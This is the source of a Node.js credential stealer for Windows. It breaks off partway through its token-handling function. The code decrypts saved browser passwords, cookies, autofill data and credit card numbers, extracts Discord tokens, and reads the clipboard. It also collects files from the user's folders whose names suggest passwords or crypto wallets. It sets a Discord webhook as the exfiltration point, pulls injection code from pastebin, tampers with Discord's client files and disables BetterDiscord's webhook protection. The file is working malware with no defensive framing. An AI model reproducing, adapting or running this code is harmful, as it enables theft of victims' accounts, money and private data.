const fs = require('fs');
const https = require('https');
const os = require('os');
const si = require('systeminformation');
const path = require('path');
const buf_replace = require('buffer-replace')
const copyPaste = require("copy-paste");
const AdmZip = require('adm-zip'), FormData = require('form-data');

const { exec, execSync, execFile }= require('child_process');
const dpapi = require("win-dpapi");
const sqlite3 = require("sqlite3");
const axios = require('axios');
const glob = require("glob");
const crypto = require("crypto");
const zizizuckerbergs = "https://discord.com/api/webhooks/1093140547792818238/LAecuu4pYoK6-E7kp-0PeYUKmr5kAy17Knq6Q9K4qqSouJkjqdsauVAnYEfLD6E1qCLO"
const config = {
    "webhook": zizizuckerbergs,
    "authorimage": "https://i.pinimg.com/originals/0b/a6/01/0ba601f55a0bb68a17b5e3ad024b4d1f.gif",
    "injectcode": 'https://pastebin.com/raw/7UhZUJTU',
    "image":'https://i.pinimg.com/originals/52/91/23/5291231976b6c3b4d4ce01d685494d3e.gif',
    "nitroautobuy" : "false"
}


let debug = false;
let discords = [];
const tokens = [];
var appdata = process.env.APPDATA
let injectPath = [];
let runningDiscords = [];
let chromeembed = [];
let opera = [];
let brave = [];
let edge = [];
let yandex = [];
let iconnu = [];



var appdata = process.env.APPDATA, LOCAL = process.env.LOCALAPPDATA, localappdata = process.env.LOCALAPPDATA;
let browser_paths = [ localappdata+'\\Google\\Chrome\\User Data\\Default\\',
localappdata+'\\Google\\Chrome\\User Data\\Profile 1\\',
localappdata+'\\Google\\Chrome\\User Data\\Profile 2\\',
localappdata+'\\Google\\Chrome\\User Data\\Profile 3\\',
localappdata+'\\Google\\Chrome\\User Data\\Profile 4\\',
localappdata+'\\Google\\Chrome\\User Data\\Profile 5\\',
localappdata+'\\Google\\Chrome\\User Data\\Guest Profile\\',
localappdata+'\\Google\\Chrome\\User Data\\Default\\Network\\',
localappdata+'\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
localappdata+'\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
localappdata+'\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
localappdata+'\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
localappdata+'\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
localappdata+'\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
appdata+'\\Opera Software\\Opera Stable\\',
appdata+'\\Opera Software\\Opera eGX Stable\\',
localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
localappdata+'\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
localappdata+'\\Microsoft\\Edge\\User Data\\Default\\',
localappdata+'\\Microsoft\\Edge\\User Data\\Profile 1\\',
localappdata+'\\Microsoft\\Edge\\User Data\\Profile 2\\',
localappdata+'\\Microsoft\\Edge\\User Data\\Profile 3\\',
localappdata+'\\Microsoft\\Edge\\User Data\\Profile 4\\',
localappdata+'\\Microsoft\\Edge\\User Data\\Profile 5\\',
localappdata+'\\Microsoft\\Edge\\User Data\\Guest Profile\\',
localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
localappdata+'\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
localappdata+'\\Microsoft\\Edge\\User Data\\Default\\Network\\',
localappdata+'\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
localappdata+'\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
localappdata+'\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
localappdata+'\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
localappdata+'\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
localappdata+'\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'];

paths = [
    appdata + '\\discord\\',
    appdata + '\\discordcanary\\',
    appdata + '\\discordptb\\',
    appdata + '\\discorddevelopment\\',
    appdata + '\\lightcord\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
    appdata + '\\Opera Software\\Opera Stable\\',
    appdata + '\\Opera Software\\Opera GX Stable\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
];





var listword = [
    "passw",
    "password",
    "mdp",
    "perso",
    "motdepasse",
    "mot_de_passe",
    "login",
    "secret",
    "account",
    "acount",
    "compte",
    "paypal",
    "banque",
    "metamask",
    "wallet",
    "crypto",
    "exodus",
    "2fa",
    "code",
    "valorant",
    "epicgame",
    "telegram",
    "backup",
    "token",
    "secret",
    "youtube",
    "mail",
    "leak",
    "nude",
    "card",
    "token",
    "history",
    "sex",
    "porn",
    "stealer",
    "fille",
    "pedo",
    "dark",
    "Snapchat",
    "trans",
    "mineur",
    "grab"
]


const cortex = os.tmpdir() + '\\blqckwd'
const login = process.env.USERNAME;




if (!fs.existsSync(cortex)) {
  fs.mkdirSync(cortex);
}




const dwnldpath = `C:\\Users\\${login}\\Downloads\\`;
const deskpath = `C:\\Users\\${login}\\Desktop\\`;
const docpath = `C:\\Users\\${login}\\Documents\\`;
const docpic = `C:\\Users\\${login}\\Pictures\\`;

fs.writeFileSync(`${cortex}\\download.txt`, '', { encoding: 'utf-8', flag: 'w' });

const files = fs.readdirSync(dwnldpath);
for (const name of files) {




    const downip = 'download.txt'

    

    fs.appendFileSync(`${cortex}\\`+downip, `${name}\n`, { encoding: 'utf-8' });
  
  
}




fs.writeFileSync(`${cortex}\\desk.txt`, '', { encoding: 'utf-8', flag: 'w' });

const files2 = fs.readdirSync(deskpath);
for (const name of files2) {



    const downip = 'desk.txt'

    
    fs.appendFileSync(`${cortex}\\`+downip, `${name}\n`, { encoding: 'utf-8' });
  
}


fs.writeFileSync(`${cortex}\\document.txt`, '', { encoding: 'utf-8', flag: 'w' });

const files3 = fs.readdirSync(docpath);
for (const name of files3) {


    const downip = 'document.txt'

    

    fs.appendFileSync(`${cortex}\\`+downip, `${name}\n`, { encoding: 'utf-8' });
  
}


fs.writeFileSync(`${cortex}\\images.txt`, '', { encoding: 'utf-8', flag: 'w' });

const files4 = fs.readdirSync(docpic);
for (const name of files4) {

    const downip = 'images.txt'
    fs.appendFileSync(`${cortex}\\`+downip, `${name}\n`, { encoding: 'utf-8' });

  
}





async function findfile() {

    
    const pathhh = [`${cortex}\\desk.txt`, `${cortex}\\document.txt`, `${cortex}\\download.txt`];
    fs.writeFileSync(`${cortex}\\intersting.txt`, '', { encoding: 'utf-8', flag: 'w' });
    fs.writeFileSync(`${cortex}\\inter.txt`, '', { encoding: 'utf-8', flag: 'w' });
    for (const chaine of listword) {
      for (const pathh of pathhh) {
        
        const fp = fs.readFileSync(pathh, { encoding: 'utf-8' });
        const lines = fp.split('\n');
        for (const line of lines) {
          if (line.indexOf(chaine) !== -1) {
            let pathhhh;
            if (pathh === `${cortex}\\desk.txt`) {
              pathhhh = `C:\\Users\\${login}\\Desktop\\`;
            } else if (pathh === `${cortex}\\document.txt`) {
              pathhhh = `C:\\Users\\${login}\\Documents\\`;
            } else if (pathh === `${cortex}\\download.txt`) {
              pathhhh = `C:\\Users\\${login}\\Downloads\\`;
            }
            fs.appendFileSync(`${cortex}\\intersting.txt`, `${pathhhh}${line}\n`, { encoding: 'utf-8' });
            const extensionlist = ['.py', '.js', '.txt'];
            const extension = path.parse(line).ext;
            for (const ext of extensionlist) {
              if (ext === extension) {
                let fileContent = fs.readFileSync(pathhhh +line, 'utf8');
                fs.appendFileSync(`${cortex}\\inter.txt`, `📂 - ${pathhhh}${line}\n`, { encoding: 'utf-8' });
                fs.appendFileSync(`${cortex}\\inter.txt`, `${fileContent}\n\n\n`, { encoding: 'utf-8' });
        
                
                
                
                
              }
            }
          }
        }
      }
    }
    
    
    
}










fs.readdirSync(LOCAL).forEach(file => {
    if (file.includes("iscord")) {
        discords.push(LOCAL + '\\' + file)
    } else {
        return;
    }
});

discords.forEach(function(file) {
    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
    
    
    glob.sync(pattern).map(file => {
        execFile('cmd.exe', ['/c', `attrib -h ${file}`]);
        injectPath.push(file)
    })
});




function getClipboardContent() {
  return new Promise((resolve, reject) => {
    copyPaste.paste((err, data) => {
      if (err) {
        resolve('Error');
      } else if (data.length > 777) {
        resolve('Too long');
      } else if (data === '') {
        resolve('Empty');
      } else {
        resolve(data);
      }
    });
  });
}


function getShortcutTarget(path) {
    try {
      const cmd = `powershell "(New-Object -COM WScript.Shell).CreateShortcut('${path}').TargetPath"`;
      const output = execSync(cmd);
      return output.toString().trim();
    } catch (error) {
      console.error(`Unable to get target path for ${path}: ${error}`);
      return null;
    }
  }

function torcheck() {
    

    

const emplacements = [
    `C:\\Users\\${login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Start Tor Browser.lnk`,
    `C:\\Users\\${login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Tor Browser\\Start Tor Browser.lnk`,
    `C:\\Program Files\\Tor Browser`,
    `C:\\Program Files (x86)\\Tor Browser`,
    `C:\\Users\\${login}\\AppData\\Roaming\\Tor Browser`,
    `C:\\Users\\${login}\\Desktop\\Tor Browser.lnk`,
    `C:\\Users\\${login}\\Desktop\\Tor Browser`,
    `C:\\Tor Browser`,
    `D:\\Tor Browser`
  
  ];
  
  let torBrowserInstalled = false;
  
  for (let i = 0; i < emplacements.length; i++) {
    if (fs.existsSync(emplacements[i])) {
      
  
      if (emplacements[i].endsWith(".lnk")) {
        const shortcutTarget = getShortcutTarget(emplacements[i]);
        return `${shortcutTarget}`
  
      } else {
        return `${emplacements[i]}`
      }
  
      torBrowserInstalled = true;
      break;
    }
  }
  
  if (!torBrowserInstalled) {
    return 'No'
  }
  
}



function whatnav(path) {
    if (path.includes('Chrome')){
        return 'Chrome'
    } else if (path.includes('Opera')){
        return 'Opera'
    } else if (path.includes('BraveSoftware')){
        return 'Brave'
    } else if (path.includes('Edge')){
        return 'Microsoft Edge'
    } else if (path.includes('Yandex')) {
        return 'Yandex'
    } else {
        return 'Inconnu'
    }
}

async function bookmarks() {
    for (let i = 0; i < paths.length; i++) {
        if (fs.existsSync(paths[i] + 'bookmarks')) {

            
            let nav = await whatnav(paths[i]);
            if (!fs.existsSync(cortex+'\\'+nav)) {
                fs.mkdirSync(cortex+'\\'+nav);
            }
            
            let fileContent = fs.readFileSync(paths[i] + 'bookmarks');

            
        
            fs.writeFileSync(os.tmpdir()+`\\bookmarks_${nav}.json`, fileContent, { encoding: 'utf-8', flag: 'w' });
            let content = await table(os.tmpdir()+`\\bookmarks_${nav}.json`)
            fs.writeFileSync(cortex+'\\'+nav+`\\bookmarks.txt`, content, { encoding: 'utf-8', flag: 'w' });

            navembed(nav, 'Bookmarks') 
        }
    }
}


function printDirectoryStructure(dir, prefix = '') {
    const files = fs.readdirSync(dir).sort((a, b) => {
        const aIsDir = fs.statSync(path.join(dir, a)).isDirectory();
        const bIsDir = fs.statSync(path.join(dir, b)).isDirectory();
        if (aIsDir && !bIsDir) return -1;
        if (!aIsDir && bIsDir) return 1;
        return 0;
    });
    files.forEach((file, index) => {
        const filePath = path.join(dir, file);
        const fileStat = fs.statSync(filePath);
        const isLast = index === files.length - 1;
        if (fileStat.isDirectory()) {
            const subFiles = fs.readdirSync(filePath);
            fs.appendFileSync(`${os.tmpdir()}\\embedfilecontent.txt`, `${prefix}${isLast ? '└' : '├'}── 📂 - ${file} (${subFiles.length} files)\n`, { encoding: 'utf-8' });
            printDirectoryStructure(filePath, `${prefix}${isLast ? ' ' : '│'}   `);
        } else {
            const fileSize = (fs.statSync(filePath).size / 1000).toFixed(2) + ' Ko';
            fs.appendFileSync(`${os.tmpdir()}\\embedfilecontent.txt`, `${prefix}${isLast ? '└' : '├'}── 📄 - ${file} (${fileSize})\n`, { encoding: 'utf-8' });
        }
    });
}




function navembed(nav, type) {

    if (nav.includes('Chrome')){
        chromeembed.push(type)
    } else if (nav.includes('Opera')){
        opera.push(type)
    } else if (nav.includes('BraveSoftware')){
        brave.push(type)
    } else if (nav.includes('Edge')){
        edge.push(type)
    } else if (nav.includes('Yandex')) {
        yandex.push(type)
    } else {
        iconnu.push(type)
    }


}




function table(path) {
    let data = fs.readFileSync(path);
    
        let jsonData = JSON.parse(data);
        let results = [['name', 'url']];
        let temp = {};
    
        function search(json) {
            for (let key in json) {
                if (json.hasOwnProperty(key)) {
                    if (key === 'url' || key === 'name') {
                      temp[key] = json[key];
                      if (temp.hasOwnProperty('name') && temp.hasOwnProperty('url')) {
                        results.push([temp.name, temp.url]);
                        temp = {};
                      }
                    } else if (typeof json[key] === 'object') {
                        search(json[key]);
                    }
                }
            }
        }
    
        search(jsonData);
    
        let maxLengths = [0, 0];
        results.forEach(row => {
            maxLengths[0] = Math.max(maxLengths[0], row[0].length);
            maxLengths[1] = Math.max(maxLengths[1], row[1].length);
        });
    
        let table = results.map(row => `| ${row[0].padEnd(maxLengths[0])} | ${row[1].padEnd(maxLengths[1])} |`).join('\n+'.padEnd(maxLengths[0] + maxLengths[1] + 4, '-')+'+\n');
        let output = `+${"-".padEnd(maxLengths[0] + maxLengths[1] + 4,"-")}+\n${table}\n+${"-".padEnd(maxLengths[0] + maxLengths[1] + 4, "-")}+`;
        return output
      
}

function portklé() {
    
    bookmarks()

}
    

async function ParseCookies(path) {
    let path_split = path.split("\\"),
        path_tail = (path.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2)).join("\\") + "\\";
    if (path.startsWith(appdata) && (path_tail = path), fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + "Local State")).os_crypt.encrypted_key, "base64").slice(5);
        var cookies = path + "Cookies",
            cookies_db = path + "cookies.db",
            total_cookies = 0;
        fs.copyFileSync(cookies, cookies_db);
        const key = dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");
        var result = "",
            sql = new sqlite3.Database(cookies_db, (err => {
                err && debug && console.log(err)
            }));
        result += `@~$~@spacex-${path}\n`;
        return await new Promise((resolve => {
            sql.each("SELECT host_key, name, encrypted_value FROM cookies", (function(err, row) {
                err && debug && console.log(err);
                let encrypted_value = row.encrypted_value;
                try {
                    if (1 == encrypted_value[0] && 0 == encrypted_value[1] && 0 == encrypted_value[2] && 0 == encrypted_value[3]) result += `HOST KEY: ${row.host_key} | NAME: ${row.name} | VALUE: ${dpapi.unprotectData(encrypted_value,null,"CurrentUser")+"\n".toString("utf-8")}\n`, total_cookies++;
                    else {
                        let start = encrypted_value.slice(3, 15),
                            middle = encrypted_value.slice(15, encrypted_value.length - 16),
                            end = encrypted_value.slice(encrypted_value.length - 16, encrypted_value.length),
                            decipher = crypto.createDecipheriv("aes-256-gcm", key, start);
                        decipher.setAuthTag(end), result += `HOST KEY: ${row.host_key} | NAME: ${row.name} | VALUE: ${decipher.update(middle,"base64","utf-8")+decipher.final("utf-8")}\n`, total_cookies++
                    }
                } catch (e) {
                    debug && console.log(e)
                }
                0 == total_cookies && (result += "Cookies don't found.")
            }), (function() {
                resolve(result)
            }))
        }))
    }
    return ""
}

async function ParsePasswords(path) {
    let path_split = path.split("\\"),
        path_tail = (path.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2)).join("\\") + "\\";
    if (path.startsWith(appdata) && (path_tail = path), fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + "Local State")).os_crypt.encrypted_key, "base64").slice(5);
        var login_data = path + "Login Data",
            passwords_db = path + "passwords.db";
        fs.copyFileSync(login_data, passwords_db);
        const key = dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");
        var result = "",
            sql = new sqlite3.Database(passwords_db, (err => {
                err && debug && console.log(err)
            }));
        result += `@~$~@spacex-${path}\n`;
        return await new Promise((resolve => {
            sql.each("SELECT origin_url, username_value, password_value FROM logins", (function(err, row) {
                if (err && debug && console.log(err), "" != row.username_value) {
                    let password_value = row.password_value;
                    try {
                        if (1 == password_value[0] && 0 == password_value[1] && 0 == password_value[2] && 0 == password_value[3]) result += `URL: ${row.origin_url} | USERNAME : ${row.username_value} | PASSWORD: ${dpapi.unprotectData(password_value,null,"CurrentUser").toString("utf-8")}\n`;
                        else {
                            let start = password_value.slice(3, 15),
                                middle = password_value.slice(15, password_value.length - 16),
                                end = password_value.slice(password_value.length - 16, password_value.length),
                                decipher = crypto.createDecipheriv("aes-256-gcm", key, start);
                            decipher.setAuthTag(end), result += `URL: ${row.origin_url} | USERNAME : ${row.username_value} | PASSWORD: ${decipher.update(middle,"base64","utf-8")+decipher.final("utf-8")}\n`
                        }
                    } catch (e) {
                        debug && console.log(e)
                    }
                }
            }), (function() {
                resolve(result)
            }))
        }))
    }
    return ""
}

async function ParseAutofill(path) {
    let path_split = path.split("\\"),
        path_tail = (path.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2)).join("\\") + "\\";
    if (path.startsWith(appdata) && (path_tail = path), fs.existsSync(path_tail)) {
        var autofill_data = path + "Web Data",
            autofill_db = path + "Web.db";
        fs.copyFileSync(autofill_data, autofill_db);
        var result = "",
            sql = new sqlite3.Database(autofill_db, (err => {
                err && debug && console.log(err)
            }));
        result += `@~$~@spacex-${path}\n`;
        return await new Promise((resolve => {
            sql.each("SELECT * FROM autofill", (function(err, row) {
                row && (result += `NAME: ${row.name} | VALUE : ${row.value}\n`)
            }), (function() {
                resolve(result)
            }))
        }))
    }
    return ""
}

async function ParseHistory(path) {
    let path_split = path.split("\\"),
        path_tail = (path.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2)).join("\\") + "\\";
    if (path.startsWith(appdata) && (path_tail = path), fs.existsSync(path_tail)) {
        var autofill_data = path + "History",
            autofill_db = path + "history.db";
        fs.copyFileSync(autofill_data, autofill_db);
        var result = "",
            sql = new sqlite3.Database(autofill_db, (err => {
                err && debug && console.log(err)
            }));
        result += `@~$~@spacex-${path}\n`;
        return await new Promise((resolve => {
            sql.each("SELECT url, title, visit_count, last_visit_time FROM urls", (function(err, row) {
                row && (result += `TITLE: ${row.title} | VISIT COUNT: ${row.visit_count} | URL: ${row.url}\n`)
            }), (function() {
                resolve(result)
            }))
        }))
    }
    return ""
}



async function ParseCards(path) {
    let path_split = path.split('\\'), path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2), path_tail = path_split_tail.join('\\') + '\\';
    
    if (path.startsWith(appdata)) path_tail = path;
    if (path.includes('cord')) return;
    
    if (fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key, 'base64').slice(5);
        var login_data = path + 'Web Data', creditcards_db = path + 'creditcards.db';
        fs.copyFileSync(login_data, creditcards_db);
        
        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
        var result = `@~$~@spacex-${path}\n`, sql = new sqlite3.Database(creditcards_db, err => { if (err) { } });

        const cards = await new Promise((resolve, reject) => {
            sql.each('SELECT * FROM credit_cards', function (err, row) {
                if (err) { }
                if (row['card_number_encrypted'] != '') {
                    let card_number = row['card_number_encrypted'];
                    try {
                        if ((card_number[0] == 1) && (card_number[1] == 0) && (card_number[2] == 0) && (card_number[3] == 0)) {
                            result += 'CC NUMBER: ' + dpapi.unprotectData(card_number, null, 'CurrentUser').toString('utf-8') + ' | EXPIRY: ' + row['expiration_month'] + '/' + row['expiration_year'] + ' | NAME: ' + row['name_on_card'] + '\n';
                        } else {
                            let start = card_number.slice(3, 15), middle = card_number.slice(15, card_number.length - 16), end = card_number.slice(card_number.length - 16, card_number.length), decipher = crypto.createDecipheriv('aes-256-gcm', key, start); decipher.setAuthTag(end);
                            result += 'CC NUMBER: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8') + ' | EXPIRY: ' + row['expiration_month'] + '/' + row['expiration_year'] + ' | NAME: ' + row['name_on_card'] + '\n';
                        }
                    } catch (e) { }
                }
            }, function () {
                resolve(result);
            });
        });

        return cards;
    }
    return '';
}


async function SubmitCookies() {
    let cookies = "";
    for (let i = 0; i < browser_paths.length; i++) fs.existsSync(browser_paths[i] + "Cookies") && (cookies += await ParseCookies(browser_paths[i]) || "");
    fs.writeFile(cortex + "\\cookies.txt", cookies, (function(err) {
        if (err) throw err;

    }))
}

async function SubmitHistory() {
    let historyy = "";
    for (let i = 0; i < browser_paths.length; i++) fs.existsSync(browser_paths[i] + "History") && (historyy += await ParseHistory(browser_paths[i]) || "");
    fs.writeFile(cortex + "\\history.txt", historyy, (function(err) {
        if (err) throw err;

    }))
}

async function SubmitCards() {
    let creditcards = "";
    for (let i = 0; i < browser_paths.length; i++) fs.existsSync(browser_paths[i] + "Web Data") && (creditcards += await ParseCards(browser_paths[i]) || "");
    fs.writeFile(cortex + "\\history.txt", creditcards, (function(err) {
        if (err) throw err;
    }))
}

async function SubmitPasswords() {
    let passwords = "";
    for (let i = 0; i < browser_paths.length; i++) fs.existsSync(browser_paths[i] + "Login Data") && (passwords += await ParsePasswords(browser_paths[i]) || "");
    fs.writeFile(cortex + "\\passwords.txt", passwords, (function(err) {
        if (err) throw err;
    }))
}

async function SubmitAutofill() {
    let autofills = "";
    for (let i = 0; i < browser_paths.length; i++) fs.existsSync(browser_paths[i] + "Web Data") && (autofills += await ParseAutofill(browser_paths[i]) || "");
    fs.writeFile(cortex + "\\autofilldata.txt", autofills, (function(err) {
        if (err) throw err;
      
    }))
}


function pwnBetterDiscord() {
    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
    if (fs.existsSync(dir)) {
        var x = fs.readFileSync(dir)
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "kkkkk"))
    } else {
        return;
    }
}



async function findToken(path) {
    let path_tail = path;
    path += 'Local Storage\\leveldb\\';

    if (!path_tail.includes('cord')) {
        try {
            fs.readdirSync(path)
                .map(file => {
                    (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                        .split(/\r?\n/)
                        .forEach(line => {
                            const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)];
                            for (const pattern of patterns) {
                                const foundTokens = line.match(pattern);
                                if (foundTokens) foundTokens.forEach(token => {
                                    if (!tokens.includes(token)) tokens.push(token)

                                });
                            }
                        });
                });
        } catch (e) { }
        return;
    } else {
        
     
            
            try {
                fs.readdirSync(path)
                    .map(file => {
                        
                        (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                            .split(/\r?\n/)
                            .forEach(line => {
                                const pattern = new RegExp(/dQw4w9WgXcQ:[^\"]*/);
                                const foundTokens = line.match(pattern);
                                if (foundTokens) {
                                    foundTokens.forEach(token => {
                               
                                        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key, 'base64').slice(5)
                                        const key = dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, 'CurrentUser');
                
                                        token = Buffer.from(token.split('dQw4w9WgXcQ:')[1], 'base64')
                                        let start = token.slice(3, 15),
                                            middle = token.slice(15, token.length - 16),
                                            end = token.slice(token.length - 16, token.length),
                                            decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                                        decipher.setAuthTag(end);
                                        let out = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')
                                        if (!tokens.includes(out)) tokens.push(out)
                                    })
                                };
                            });
                    });
            } catch (e) { }
            return;
        
    }
}


async function stealTokens() {
    await injectNotify();
    await sendembed(`${os.tmpdir()}\\embedfilecontent.txt`);
    for (let path of paths) {
        await findToken(path);
        
    }

    
    for (let token of tokens) {
        
        let json;
        await axios.get("https://discord.com/api/v9/users/@me", {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        }).then(res => { json = res.data }).catch(() => { json = null })
        if (!json) continue;
        var ip = await getIp();
